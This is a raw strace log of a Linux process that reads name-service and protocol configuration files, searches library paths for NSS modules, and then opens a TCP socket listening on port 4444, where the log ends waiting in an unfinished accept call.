5971  07:11:35.504709 open("/etc/nsswitch.conf", O_RDONLY) = 6
5971  07:11:35.504752 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
5971  07:11:35.504772 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7efa000
5971  07:11:35.504787 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
5971  07:11:35.504854 read(6, "", 4096) = 0
5971  07:11:35.504865 close(6)          = 0
5971  07:11:35.504891 munmap(0xb7efa000, 4096) = 0
5971  07:11:35.504972 open("/etc/ld.so.cache", O_RDONLY) = 6
5971  07:11:35.505021 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5971  07:11:35.505077 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d01000
5971  07:11:35.505102 close(6)          = 0
5971  07:11:35.505153 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5971  07:11:35.505258 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505280 stat64("/lib/tls/i686/sse2/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505301 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505322 stat64("/lib/tls/i686/sse2", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505352 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505369 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5971  07:11:35.505394 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505412 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5971  07:11:35.505438 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505457 stat64("/lib/tls/sse2/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505473 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505491 stat64("/lib/tls/sse2", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505502 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505514 stat64("/lib/tls/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505525 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505537 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5971  07:11:35.505554 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505566 stat64("/lib/i686/sse2/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505577 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505589 stat64("/lib/i686/sse2", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505600 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505612 stat64("/lib/i686/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505622 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505634 stat64("/lib/i686", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505644 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505669 stat64("/lib/sse2/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505681 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505716 stat64("/lib/sse2", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505727 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505739 stat64("/lib/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505763 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505774 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5971  07:11:35.505791 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505804 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505816 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505828 stat64("/usr/lib/tls/i686/sse2", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505839 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505852 stat64("/usr/lib/tls/i686/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505869 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505881 stat64("/usr/lib/tls/i686", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505892 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505905 stat64("/usr/lib/tls/sse2/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505916 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505928 stat64("/usr/lib/tls/sse2", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505939 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505951 stat64("/usr/lib/tls/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505962 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505973 stat64("/usr/lib/tls", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.505984 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.505997 stat64("/usr/lib/i686/sse2/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506008 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506020 stat64("/usr/lib/i686/sse2", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506031 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506044 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5971  07:11:35.506062 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506074 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5971  07:11:35.506091 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506103 stat64("/usr/lib/sse2/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506114 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506126 stat64("/usr/lib/sse2", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506136 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506148 stat64("/usr/lib/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506169 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506207 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
5971  07:11:35.506225 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506254 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506266 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506279 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506291 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506304 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506316 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506329 stat64("/lib/i486-linux-gnu/tls/i686", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506341 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506354 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506366 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506381 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506393 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506406 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506418 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506430 stat64("/lib/i486-linux-gnu/tls", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506441 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506454 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506467 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506479 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506491 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506504 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506516 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506528 stat64("/lib/i486-linux-gnu/i686", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506540 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506552 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506564 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506577 stat64("/lib/i486-linux-gnu/sse2", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506588 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506601 stat64("/lib/i486-linux-gnu/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506612 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506624 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5971  07:11:35.506641 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506665 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506705 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506719 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506745 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506759 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506771 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506784 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506796 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506809 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506821 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506834 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506846 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506862 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506874 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506887 stat64("/usr/lib/i486-linux-gnu/tls", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506898 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506912 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506924 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506937 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506949 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506962 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506974 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.506987 stat64("/usr/lib/i486-linux-gnu/i686", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.506998 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.507012 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.507024 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.507036 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.507048 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.507062 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbf8ebd7c) = -1 ENOENT (No such file or directory)
5971  07:11:35.507074 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5971  07:11:35.507086 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5971  07:11:35.507105 munmap(0xb7d01000, 29913) = 0
5971  07:11:35.507126 open("/etc/ld.so.cache", O_RDONLY) = 6
5971  07:11:35.507139 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5971  07:11:35.507147 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d01000
5971  07:11:35.507147 close(6)          = 0
5971  07:11:35.507148 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5971  07:11:35.507148 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
5971  07:11:35.507157 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5971  07:11:35.507247 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
5971  07:11:35.507272 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7cf6000
5971  07:11:35.507284 mmap2(0xb7cff000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7cff000
5971  07:11:35.507301 close(6)          = 0
5971  07:11:35.507324 munmap(0xb7d01000, 29913) = 0
5971  07:11:35.507341 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
5971  07:11:35.507359 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
5971  07:11:35.507376 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
5971  07:11:35.507393 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d08000
5971  07:11:35.507404 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
5971  07:11:35.507559 close(6)          = 0
5971  07:11:35.507570 munmap(0xb7d08000, 4096) = 0
5971  07:11:35.507589 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
5971  07:11:35.507603 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
5971  07:11:35.507619 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d08000
5971  07:11:35.507630 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
5971  07:11:35.507804 close(6)          = 0
5971  07:11:35.507813 munmap(0xb7d08000, 4096) = 0
5971  07:11:35.507842 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
5971  07:11:35.507863 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ec288) = -1 EINVAL (Invalid argument)
5971  07:11:35.507889 _llseek(6, 0, 0xbf8ec2d0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5971  07:11:35.507928 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ec288) = -1 EINVAL (Invalid argument)
5971  07:11:35.507939 _llseek(6, 0, 0xbf8ec2d0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5971  07:11:35.507949 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
5971  07:11:35.508018 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
5971  07:11:35.508054 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
5971  07:11:35.508082 listen(6, 5)      = 0
5971  07:11:35.508138 accept(6,  <unfinished ...>
